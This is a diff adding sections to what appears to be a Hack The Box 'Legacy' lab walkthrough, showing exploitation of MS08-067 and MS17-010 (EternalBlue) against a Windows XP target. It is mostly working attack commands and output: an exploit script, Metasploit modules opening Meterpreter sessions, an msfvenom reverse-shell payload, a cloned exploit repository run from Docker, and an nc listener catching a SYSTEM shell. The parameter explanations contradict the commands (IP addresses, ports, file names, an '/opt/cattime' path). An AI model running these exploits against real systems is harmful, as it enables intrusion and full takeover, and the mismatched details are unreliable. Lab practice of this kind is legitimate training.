@@ -338,9 +338,331 @@ Then, I executed the exploit script:
 python3 MS08-067.py 10.10.10.4 6 445
 ```
 
+![Pasted image 20250308095159](https://github.com/user-attachments/assets/aae1aa85-ae52-4d1f-a636-c57a0a582bae)
+
+
+With SYSTEM-level access, I navigated to the user and administrator directories to retrieve the flags:
+
+```
+C:\Documents and Settings\john\Desktop>type user.txt
+e69af0e4...
+
+C:\Documents and Settings\Administrator\Desktop>type root.txt
+993442d2...
+```
+
+
+##  Exploiting MS08-067 Using Metasploit
+
+For those who prefer a more automated approach, **Metasploit** provides a reliable and efficient way to exploit the **MS08-067** vulnerability. Below is a step-by-step guide to exploiting the Legacy box using Metasploit.
+
+Start Metasploit with the following command:
+
+```
+msfconsole -q
+```
+
+Use the `ms08_067_netapi` exploit module:
+
+```
+msf6 > use exploit/windows/smb/ms08_067_netapi
+```
+
+Set the target host (`RHOSTS`) and the listener IP (`LHOST`):
+
+```
+msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
+RHOSTS => 10.10.10.4
+
+msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
+LHOST => tun0
+```
+
+Verify the configuration with the `options` command:
+
+```
+msf6 exploit(windows/smb/ms08_067_netapi) > options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   10.10.10.4       yes       The target host(s)
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description 
+   ----      ---------------  --------  ----------- 
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     tun0             yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+```
+
+Execute the exploit with the `run` command:
+
+```
+msf6 exploit(windows/smb/ms08_067_netapi) > run
+
+[*] Started reverse TCP handler on 10.10.16.8:4444  
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (177734 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.16.8:4444 -> 10.10.10.4:1037) at 2025-03-08 14:03:00 -0500
+```
+
+Once the exploit succeeds, a Meterpreter session is established. Verify the privileges and explore the system:
+
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > pwd
+C:\WINDOWS\system32
+
+meterpreter > cd ../../
+meterpreter > dir
+Listing: C:\
+============
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100777/rwxrwxrwx  0       fil   2017-03-16 01:30:44 -0400  AUTOEXEC.BAT
+100666/rw-rw-rw-  0       fil   2017-03-16 01:30:44 -0400  CONFIG.SYS
+040777/rwxrwxrwx  0       dir   2017-03-16 02:07:20 -0400  Documents and Settings
+100444/r--r--r--  0       fil   2017-03-16 01:30:44 -0400  IO.SYS
+100444/r--r--r--  0       fil   2017-03-16 01:30:44 -0400  MSDOS.SYS
+100555/r-xr-xr-x  47564   fil   2008-04-13 16:13:04 -0400  NTDETECT.COM
+040555/r-xr-xr-x  0       dir   2017-12-29 15:41:18 -0500  Program Files
+040777/rwxrwxrwx  0       dir   2017-03-16 01:32:59 -0400  System Volume Information
+040777/rwxrwxrwx  0       dir   2022-05-18 08:10:06 -0400  WINDOWS
+100666/rw-rw-rw-  211     fil   2017-03-16 01:26:58 -0400  boot.ini
+100444/r--r--r--  250048  fil   2008-04-13 18:01:44 -0400  ntldr
+000000/---------  0       fif   1969-12-31 19:00:00 -0500  pagefile.sys
+
+```
+
+Navigate to the user and administrator directories to retrieve the flags:
+
+```
+meterpreter > cd "Documents and Settings\john\Desktop"
+meterpreter > cat user.txt
+e69af0e4...
+
+meterpreter > cd "Documents and Settings\Administrator\Desktop"
+meterpreter > cat root.txt
+993442d2...
+```
+
+
+# Exploiting MS17-010 (EternalBlue) - CVE-2017-0143
+
+The **MS17-010** vulnerability, also known as `EternalBlue`, is a critical remote code execution flaw in Microsoft's SMBv1 protocol. On the Legacy box, this vulnerability allows for SYSTEM-level access. 
+
+
+Using `msfvenom` to Generate a Payload:
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=1337 -f exe -o ms17-010.exe
+```
+
+- `-p windows/shell_reverse_tcp`: Specifies the payload (a reverse TCP shell for Windows).
+- `LHOST=10.10.14.4`: The attacker's IP address (where the target will connect back).
+- `LPORT=443`: The port on the attacker's machine to listen for the connection.
+- `-f exe`: Outputs the payload as an executable file.
+- `-a x86`: Specifies the architecture (32-bit).
+- `-o rev.exe`: Saves the payload as `rev.exe`.
+
+Setting Up a Docker Container:
+
+- **Why Use Docker?**
+    - Docker provides a consistent and isolated environment for running the exploit.
+    - It avoids dependency issues (e.g., Python version conflicts, missing libraries).
+
+Steps to Set Up Docker:
+
+```
+sudo apt-get install docker.io
+```
+
+Create a Folder Structure:
+
+```
+mkdir exploit
+cd exploit
+touch Dockerfile
+echo "impacket==0.9.23" > requirements.txt
+```
+
+* `Dockerfile`: Contains instructions for building the Docker container.
+* `requirements.txt`: Lists Python dependencies (e.g., `impacket`).
+
+Write the Dockerfile:
+
+```
+FROM python:2.7-alpine
+RUN apk --update --no-cache add \
+    git \
+    zlib-dev \
+    musl-dev \
+    libc-dev \
+    gcc \
+    libffi-dev \
+    openssl-dev && \
+    rm -rf /var/cache/apk/*
+
+RUN mkdir -p /opt/exploit
+COPY requirements.txt /opt/exploit
+COPY ms17-010.exe /opt/exploit
+WORKDIR /opt/exploit
+RUN pip install -r requirements.txt
+```
+
+* `FROM python:2.7-alpine`: Uses a lightweight Alpine Linux image with Python 2.7.
+* `RUN apk --update --no-cache add`: Installs necessary dependencies (e.g., `git`, `gcc`).
+* `COPY rev.exe /opt/cattime`: Copies the reverse shell executable (`rev.exe`) into the container.
+* `RUN pip install -r requirements.txt`: Installs Python dependencies (e.g., `impacket`).
+
+Build the Docker Container:
+
+```
+sudo docker build -t exploit .
+```
+
+Run the Container:
+
+```
+sudo docker run -it exploit /bin/sh
+```
+
+Downloading and Running the Exploit:
+
+```
+git clone https://github.com/n3rdh4x0r/MS17-010_CVE-2017-0143.git
+```
+
+```
+cd MS17-010_CVE-2017-0143
+```
+
+```
+python send_and_execute.py 10.10.10.4 ../ms17-010.exe
+```
+
+Reverse Shell:
+
+```
+nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.4] 1035
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+```
+
+
+----
+
+## Automated Python3 script. https://github.com/n3rdh4x0r/MS17-010
+
+```
+python3 exploit.py 10.10.10.4
+```
+
+![Pasted image 20250312115544](https://github.com/user-attachments/assets/9e38f8ad-359d-4d55-b427-8a09526e5480)
+
+
+##  Exploiting MS17-010 Using Metasploit
+
+Let's use metasploit to get the shell. 
+
+```
+┌──(kali㉿kali)-[~/exploit]
+└─$ sudo msfconsole -q                 
+msf6 > use windows/smb/ms17_010_psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_psexec) > show options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT                 445                                                             yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBUser                                                                               no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
 
 
 
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS
+RHOSTS => 
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.4
+RHOSTS => 10.10.10.4
+msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
+LHOST => 10.10.14.19
+msf6 exploit(windows/smb/ms17_010_psexec) > run
+
+[*] Started reverse TCP handler on 10.10.14.4:4444 
+[*] 10.10.10.4:445 - Target OS: Windows 5.1
+[*] 10.10.10.4:445 - Filling barrel with fish... done
+[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
+[*] 10.10.10.4:445 -    [*] Preparing dynamite...
+[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!
+[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
+[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
+[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
+[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x82236988
+[*] 10.10.10.4:445 - Built a write-what-where primitive...
+[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.10.10.4:445 - Selecting native target
+[*] 10.10.10.4:445 - Uploading payload... mxhfiscf.exe
+[*] 10.10.10.4:445 - Created \mxhfiscf.exe...
+[+] 10.10.10.4:445 - Service started successfully...
+[*] Sending stage (175174 bytes) to 10.10.10.4
+[*] 10.10.10.4:445 - Deleting \mxhfiscf.exe...
+[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.4:1031) at 2025-03-12 18:32:56 +1200
+
+meterpreter >
+```
 
 
 
